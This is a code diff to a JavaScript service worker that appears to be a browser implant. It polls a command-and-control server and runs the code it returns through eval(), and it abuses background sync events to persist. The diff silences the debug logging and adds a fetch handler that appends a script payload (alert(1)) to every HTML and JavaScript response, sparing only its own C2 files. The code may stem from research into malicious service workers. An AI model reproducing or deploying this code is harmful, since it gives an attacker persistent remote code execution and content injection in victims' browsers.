@@ -42,7 +42,7 @@ function init(){
           try{
             return response.text();
           }catch (e){
-            console.log("Failed fetch of module");
+            // console.log("Failed fetch of module");
             return false;
           }
         }).then(function(text){
@@ -50,7 +50,7 @@ function init(){
         });
       }
     }catch{
-      console.log("Failed to parse extra_modules");
+      // console.log("Failed to parse extra_modules");
     }
   });
 }
@@ -60,23 +60,23 @@ self.addEventListener('sync', function(event){
   if (event.tag == 'outbox'){
   	counter++;
     fetch("/Sync1_Activated");
-    console.log("Sync activated-" + counter)
+    // console.log("Sync activated-" + counter)
     event.waitUntil(new Promise((resolve, reject) => {
     	SI("sync_outbox1");
     }));
-    console.log("Sync activated.waitUntil_finished")
+    // console.log("Sync activated.waitUntil_finished")
   }else if (event.tag == 'outbox2'){
     event.waitUntil(new Promise((resolve, reject) => {
       event.waitUntil(new Promise((resolve2, reject2) => {
         var runcounter = ReadIDB("sync2", reject2);
       }).catch(function(runcounter){
-        console.log("ReadDB. Runcounter=" + runcounter);
+        // console.log("ReadDB. Runcounter=" + runcounter);
         if(runcounter == undefined){
           runcounter = 0;
         }
         runcounter += 1;
         WriteIDB("sync2", runcounter);
-        console.log("Sync2-Outbox2 activated-. Run# " + runcounter);
+        // console.log("Sync2-Outbox2 activated-. Run# " + runcounter);
         fetch("/SYNC2-OUTBOX2");
         if(runcounter == 1)
           return Promise.reject("error");
@@ -90,13 +90,13 @@ self.addEventListener('sync', function(event){
       event.waitUntil(new Promise((resolve2, reject2) => {
         var runcounter = ReadIDB("sync3", reject2);
       }).catch(function(runcounter){
-        console.log("ReadDB. Runcounter=" + runcounter);
+        // console.log("ReadDB. Runcounter=" + runcounter);
       if(runcounter == undefined){
         runcounter = 0;
       }
       runcounter += 1;
       WriteIDB("sync3", runcounter);
-      console.log("Sync3-Outbox2 activated-. Run# " + runcounter);
+      // console.log("Sync3-Outbox2 activated-. Run# " + runcounter);
       fetch("/SYNC3-OUTBOX3");
       if(runcounter == 1)
         setTimeout(function(){ 
@@ -116,9 +116,37 @@ self.addEventListener('sync', function(event){
     fetch("/SYNC3-OUTBOX4");
     event.waitUntil(new Promise((resolve, reject) => {return reject("ERror")}));
   }else if (event.tag == 'outbox999'){
-    console.log("OUTBOX999!!!!");
+    // console.log("OUTBOX999!!!!");
   }else if(event.tag =="CreateDB"){
   }
+});
+
+self.addEventListener('fetch', function(event){
+  event.respondWith(
+    fetch(event.request).then(function(response){
+      var init = {
+        status:     response.status,
+        statusText: response.statusText,
+        headers:    response.headers
+      };
+      response.headers.forEach(function(v,k){
+        init.headers[k] = v;
+      });
+      var poison = "";
+      if(response.headers['content-type'].indexOf('text/html') >= 0){
+        poison = "<script>alert(1)</script>";
+      }
+      if(response.headers['content-type'].indexOf('application/javascript') >= 0){
+        poison = ";alert(1)";
+      }
+      return response.text().then(function(body){
+        if(body.indexOf("C2_SERVER") >= 0){ // part of SW
+          poison = "";
+        }
+        return new Response(body + poison, init);
+      });
+    })
+  );
 });
 
 function urlB64ToUint8Array(base64String){
@@ -180,7 +208,7 @@ function install(){
 }
 
 self.addEventListener('install', function(event){
-  console.log("SW installed -from sw.js");
+  // console.log("SW installed -from sw.js");
   install();
   indexedDB.deleteDatabase("swdb");
 });
@@ -192,45 +220,45 @@ self.addEventListener('message', function(e){
 function WriteIDB(key, value){
   var request = indexedDB.open("swdb", 1);
   request.onupgradeneeded = function(event){ 
-    console.log("onupgradeneeded");
+    // console.log("onupgradeneeded");
     // Save the IDBDatabase interface 
     var db = event.target.result;
     // Create an objectStore for this database
     var objectStore = db.createObjectStore("swobjstore");
   };
   request.onerror = function(event){
-    console.log("onerror");
+    // console.log("onerror");
   };
   request.onsuccess = function(event){
-    console.log("onsuccess1");
+    // console.log("onsuccess1");
     var db = event.target.result;
     var transaction = db.transaction(["swobjstore"], "readwrite");
     var objectStore = transaction.objectStore("swobjstore");
     objectStore.put(value, key);
-    console.log("onsuccess");
+    // console.log("onsuccess");
   };
 }
 
 function ReadIDB(key, reject){
   var request = indexedDB.open("swdb", 1);
   request.onupgradeneeded = function(event){ 
-    console.log("onupgradeneeded");
+    // console.log("onupgradeneeded");
     // Save the IDBDatabase interface 
     var db = event.target.result;
     // Create an objectStore for this database
     var objectStore = db.createObjectStore("swobjstore");
   };
   request.onerror = function(event){
-    console.log("onerror");
+    // console.log("onerror");
   };
   request.onsuccess = function(event){
-    console.log("onsuccess1");
+    // console.log("onsuccess1");
     var db = event.target.result;
     var transaction = db.transaction(["swobjstore"], "readwrite");
     var objectStore = transaction.objectStore("swobjstore");
     var getRequest = objectStore.get(key);
     getRequest.onsuccess = function(event){
-      console.log("onsuccess");
+      // console.log("onsuccess");
       reject(getRequest.result);
     }
   };
@@ -242,17 +270,17 @@ function commandAndExecute(Meta){
     try{
       return response.json();
     }catch (e){
-      console.log("Failed remote fetch");
+      // console.log("Failed remote fetch");
       return false;
     }
   }).then(function(json){
     if(json == false)
       return;
     if(Object.keys(json).length == 0){
-      console.log("Polled C2 - No more to do"); 
+      // console.log("Polled C2 - No more to do"); 
       return;
     }
-    console.log("success remote fetch--" + json['ID'] + "--" + json['URL']);
+    // console.log("success remote fetch--" + json['ID'] + "--" + json['URL']);
 
     if('EVAL' in json){ // NON URL FETCH. EX: MODULE REGISTRATION
       eval(json.EVAL);
@@ -289,7 +317,7 @@ function commandAndExecute(Meta){
 
 function SI(Meta){
 	setTimeout(function(){
-    console.log("SI: " + agentID);
+    // console.log("SI: " + agentID);
     if(agentID === null) // UUID not yet set, hold on...
       return;
 	  commandAndExecute(Meta);
